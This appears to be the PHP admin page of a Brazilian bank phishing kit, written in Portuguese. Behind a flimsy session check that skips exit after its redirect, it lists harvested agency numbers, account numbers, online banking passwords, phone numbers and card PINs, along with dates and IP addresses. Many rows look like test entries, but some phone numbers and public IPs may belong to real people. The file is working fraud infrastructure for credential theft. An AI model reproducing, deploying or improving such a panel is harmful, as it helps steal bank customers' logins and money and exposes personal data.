<?php

error_reporting(0);

session_start();
if (!isset($_SESSION['user']) || !isset($_SESSION['pass'])) {
	setcookie('msg','<center>Voce deve logar-se primeiro',time()+1);
	header('Location: admin_tela.php');
}

if (@$_GET['action'] == 'sair') {
	session_destroy();
	header('Location: admin_tela.php');
}

?>











<style>
BODY {
background-color : black;
}
</style>



<head>



<meta charset="utf-8">



</head>


<br>

<center><a href="logout.php"> Sair </a></center>

<br>

<table border="2" style="width:100%">

<tr><td><font color='red' size='5'>AGENCIA</font></td><td><font color='red' size='5'>CONTA</font><td><font color='red' size='5'>SENHA ELETRONICA</font></td><td><font color='red' size='5'>TELEFONE</font><td><font color='red' size='5'>SENHA DO CARTAO</font><td><font color='red' size='5'>DATA</font></td><td><font color='red' size='5'>IP</font></tr>



<tr><td><font color='red' size='4'>5454</font></td><td><font color='red' size='4'>44545-4</font></td><td><font color='red' size='4'>54545454</font></td><td><font color='red' size='4'>05 154545454</font></td><td><font color='red' size='4'>545545</font></td><td><font color='red' size='4'>19/06/2018</font></td><td><font color='red' size='4'>::1</font></td></tr>
<tr><td><font color='red' size='4'>8585</font></td><td><font color='red' size='4'>86858-8</font></td><td><font color='red' size='4'>58585858</font></td><td><font color='red' size='4'>22 991030531</font></td><td><font color='red' size='4'>9865</font></td><td><font color='red' size='4'>25/07/2018</font></td><td><font color='red' size='4'>177.79.48.147</font></td></tr>
<tr><td><font color='red' size='4'></font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'> </font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'>25/07/2018</font></td><td><font color='red' size='4'>177.79.4.220</font></td></tr>
<tr><td><font color='red' size='4'>6828</font></td><td><font color='red' size='4'>68686-8</font></td><td><font color='red' size='4'>58585868</font></td><td><font color='red' size='4'>22 991030531</font></td><td><font color='red' size='4'>72758</font></td><td><font color='red' size='4'>25/07/2018</font></td><td><font color='red' size='4'>177.79.48.147</font></td></tr>
<tr><td><font color='red' size='4'></font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'> </font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'>25/07/2018</font></td><td><font color='red' size='4'>177.79.4.220</font></td></tr>
<tr><td><font color='red' size='4'>6868</font></td><td><font color='red' size='4'>68686-8</font></td><td><font color='red' size='4'>68685858</font></td><td><font color='red' size='4'>22 99103086</font></td><td><font color='red' size='4'>25898</font></td><td><font color='red' size='4'>25/07/2018</font></td><td><font color='red' size='4'>177.79.48.147</font></td></tr>
<tr><td><font color='red' size='4'></font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'> </font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'>25/07/2018</font></td><td><font color='red' size='4'>177.79.48.147</font></td></tr>
<tr><td><font color='red' size='4'></font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'> </font></td><td><font color='red' size='4'></font></td><td><font color='red' size='4'>25/07/2018</font></td><td><font color='red' size='4'>177.79.4.220</font></td></tr>
<tr><td><font color='red' size='4'>1021</font></td><td><font color='red' size='4'>19482-9</font></td><td><font color='red' size='4'>48829299</font></td><td><font color='red' size='4'>31 998373872</font></td><td><font color='red' size='4'>828377</font></td><td><font color='red' size='4'>24/11/2018</font></td><td><font color='red' size='4'>127.0.0.1</font></td></tr>
<tr><td><font color='red' size='4'>3948</font></td><td><font color='red' size='4'>82730-2</font></td><td><font color='red' size='4'>88288272</font></td><td><font color='red' size='4'>31 998373827</font></td><td><font color='red' size='4'>277272</font></td><td><font color='red' size='4'>24/11/2018</font></td><td><font color='red' size='4'>127.0.0.1</font></td></tr>